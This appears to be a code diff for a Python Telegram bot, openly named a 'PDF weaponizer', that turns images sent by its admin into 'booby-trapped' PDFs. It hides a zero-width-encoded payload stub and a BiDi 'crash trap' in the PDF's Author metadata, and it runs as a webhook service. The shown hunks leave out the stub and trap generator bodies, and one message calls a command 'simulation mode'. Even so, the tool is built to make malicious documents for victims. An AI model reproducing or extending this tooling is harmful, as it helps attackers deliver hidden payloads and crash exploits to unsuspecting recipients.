@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================================
-# ARCHITECT TELEGRAM PDF WEAPONIZER - RENDER EDITION (NO FLASK)
+# ARCHITECT TELEGRAM PDF WEAPONIZER - RENDER FINAL
+# ============================================================
+# "جاهز سيدي المطور" - لا يحتوي على Flask
 # ============================================================
 
 import os
@@ -26,7 +28,7 @@ if not BOT_TOKEN or ADMIN_ID == 0 or not WEBHOOK_URL:
     raise ValueError("❌ BOT_TOKEN, ADMIN_ID, and WEBHOOK_URL are required!")
 
 # ==============================================
-# Zero-Width + BiDi Exploit Generator
+# Zero-Width Steganography + BiDi Exploit Generator
 # ==============================================
 ZW_MAP = {'0': '\u200b', '1': '\u200c', 'B': '\u200d', 'E': '\ufeff'}
 
@@ -47,26 +49,26 @@ def generate_payload_stub():
 def create_weaponized_pdf(image_bytes):
     img = Image.open(io.BytesIO(image_bytes))
     img_width, img_height = img.size
-    
+
     pdf_buffer = io.BytesIO()
     page_width = min(img_width, 595)
     page_height = min(img_height, 842)
     c = canvas.Canvas(pdf_buffer, pagesize=(page_width, page_height))
-    
+
     scale = min(page_width / img_width, page_height / img_height, 1.0)
     draw_width = img_width * scale
     draw_height = img_height * scale
     x_offset = (page_width - draw_width) / 2
     y_offset = (page_height - draw_height) / 2
-    
+
     img_reader = ImageReader(img)
     c.drawImage(img_reader, x_offset, y_offset, width=draw_width, height=draw_height)
-    
+
     stub = generate_payload_stub()
     hidden_payload = binary_to_zero_width(stub)
     crash_trap = generate_crash_trap()
     malicious_unicode = hidden_payload + crash_trap
-    
+
     c.setAuthor(malicious_unicode)
     c.setTitle(f"DOC_{uuid.uuid4().hex[:6].upper()}")
     c.save()
@@ -83,7 +85,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ غير مصرح.")
         return
-    await update.message.reply_text("🖤 *جاهز سيدي المطور.*\n\n⚡ *الوحش يعمل*\n\n📸 *أرسل صورة لتحويلها إلى PDF ملغوم.*", parse_mode='Markdown')
+    await update.message.reply_text(
+        "🖤 *جاهز سيدي المطور.*\n\n"
+        "⚡ *الوحش يعمل على Render*\n\n"
+        "📸 *أرسل صورة لتحويلها إلى PDF ملغوم.*",
+        parse_mode='Markdown'
+    )
 
 async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -119,7 +126,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text("✅ تم إرسال الأمر (وضع المحاكاة).")
 
 # ==============================================
-# Initialize and Run with Webhook
+# Initialize and Run with Webhook (No Flask)
 # ==============================================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -127,7 +134,7 @@ def main():
     app.add_handler(CommandHandler("panel", panel))
     app.add_handler(MessageHandler(filters.PHOTO, handle_image))
     app.add_handler(CallbackQueryHandler(button_handler))
-    
+
     logger.info(f"🚀 Starting webhook on port {PORT}")
     app.run_webhook(
         listen="0.0.0.0",
